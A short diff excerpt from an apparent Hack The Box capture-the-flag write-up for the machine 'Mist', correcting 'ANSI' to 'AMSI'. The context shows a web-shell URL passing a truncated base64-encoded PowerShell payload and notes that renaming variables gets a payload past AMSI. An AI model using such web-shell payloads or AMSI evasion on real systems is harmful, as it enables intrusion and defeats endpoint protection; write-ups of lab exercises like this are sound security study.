@@ -159,7 +159,7 @@ http://mist.htb/data/modules/shell/exploit/shell.php?cmd=powershell -e JABjAGwAa
 
 I try running the payload above which is a powershell #3 (base64) encoded payload that usually works for windows environments. 
 
-Its possible that ANSI is preventing this
+Its possible that AMSI is preventing this
 
 After doing some research on this i find out the powershell #2 payload works if you change the variable names
 
